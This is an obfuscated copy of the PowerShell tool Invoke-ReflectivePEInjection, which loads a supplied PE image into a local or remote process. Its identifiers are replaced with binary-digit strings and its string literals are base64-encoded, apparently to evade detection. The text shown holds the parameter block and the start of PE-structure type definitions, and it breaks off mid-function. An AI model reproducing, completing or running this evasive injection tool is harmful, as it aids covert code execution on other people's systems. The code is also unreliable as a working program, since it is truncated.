function Invoke-ReflectivePEInjection
{
[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,
	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',
	[Parameter(Position = 3)]
	[String]
	$ExeArgs,
	[Parameter(Position = 4)]
	[Int32]
	$ProcId,
	[Parameter(Position = 5)]
	[String]
	$ProcName,
    [Switch]
    $ForceASLR,
	[Switch]
	$DoNotZeroMZ
)
Set-StrictMode -Version 2
${00110110111111101} = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,
        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)
	Function _01001100001111011
	{
		$Win32Types = New-Object System.Object
		${01011011111010100} = [AppDomain]::CurrentDomain
		${00011100110001001} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkA'))))
		${01110111110000010} = ${01011011111010100}.DefineDynamicAssembly(${00011100110001001}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		${10001000111011001} = ${01110111110000010}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBNAG8AZAB1AGwAZQA='))), $false)
		${01110011100100001} = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
		${01100110111100111} = ${10001000111011001}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUA'))), [UInt16] 0) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQAzADgANgA='))), [UInt16] 0x014c) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQB0AGEAbgBpAHUAbQA='))), [UInt16] 0x0200) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eAA2ADQA'))), [UInt16] 0x8664) | Out-Null
		${10010110000100000} = ${01100110111100111}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value ${10010110000100000}
		${01100110111100111} = ${10001000111011001}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAFQAeQBwAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIAMwAyAF8ATQBBAEcASQBDAA=='))), [UInt16] 0x10b) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))), [UInt16] 0x20b) | Out-Null
		${01011011010110100} = ${01100110111100111}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value ${01011011010110100}
		${01100110111100111} = ${10001000111011001}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAUwB5AHMAdABlAG0AVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBVAE4ASwBOAE8AVwBOAA=='))), [UInt16] 0) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBOAEEAVABJAFYARQA='))), [UInt16] 1) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8ARwBVAEkA'))), [UInt16] 2) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBVAEkA'))), [UInt16] 3) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBQAE8AUwBJAFgAXwBDAFUASQA='))), [UInt16] 7) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBFAF8ARwBVAEkA'))), [UInt16] 9) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEEAUABQAEwASQBDAEEAVABJAE8ATgA='))), [UInt16] 10) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEIATwBPAFQAXwBTAEUAUgBWAEkAQwBFAF8ARABSAEkAVgBFAFIA'))), [UInt16] 11) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIAVQBOAFQASQBNAEUAXwBEAFIASQBWAEUAUgA='))), [UInt16] 12) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIATwBNAA=='))), [UInt16] 13) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBYAEIATwBYAA=='))), [UInt16] 14) | Out-Null
		${10000001011110001} = ${01100110111100111}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value ${10000001011110001}
		${01100110111100111} = ${10001000111011001}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMAVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAwAA=='))), [UInt16] 0x0001) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAxAA=='))), [UInt16] 0x0002) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAyAA=='))), [UInt16] 0x0004) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAzAA=='))), [UInt16] 0x0008) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEQAWQBOAEEATQBJAEMAXwBCAEEAUwBFAA=='))), [UInt16] 0x0040) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEYATwBSAEMARQBfAEkATgBUAEUARwBSAEkAVABZAA=='))), [UInt16] 0x0080) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAE4AWABfAEMATwBNAFAAQQBUAA=='))), [UInt16] 0x0100) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBJAFMATwBMAEEAVABJAE8ATgA='))), [UInt16] 0x0200) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBTAEUASAA='))), [UInt16] 0x0400) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBCAEkATgBEAA=='))), [UInt16] 0x0800) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwA0AA=='))), [UInt16] 0x1000) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBXAEQATQBfAEQAUgBJAFYARQBSAA=='))), [UInt16] 0x2000) | Out-Null
		${01100110111100111}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBUAEUAUgBNAEkATgBBAEwAXwBTAEUAUgBWAEUAUgBfAEEAVwBBAFIARQA='))), [UInt16] 0x8000) | Out-Null
		${01101010000001001} = ${01100110111100111}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value ${01101010000001001}
		${10011010100101001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${01100110111100111} = ${10001000111011001}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABBAFQAQQBfAEQASQBSAEUAQwBUAE8AUgBZAA=='))), ${10011010100101001}, [System.ValueType], 8)
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		${00111110101011000} = ${01100110111100111}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value ${00111110101011000}
		${10011010100101001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${01100110111100111} = ${10001000111011001}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARgBJAEwARQBfAEgARQBBAEQARQBSAA=='))), ${10011010100101001}, [System.ValueType], 20)
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAZQBjAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AG0AYgBvAGwAVABhAGIAbABlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAeQBtAGIAbwBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYATwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100101100110010} = ${01100110111100111}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value ${01100101100110010}
		${10011010100101001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${01100110111100111} = ${10001000111011001}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIANgA0AA=='))), ${10011010100101001}, [System.ValueType], 240)
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${01011011010110100}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${10000001011110001}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${01101010000001001}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(108) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
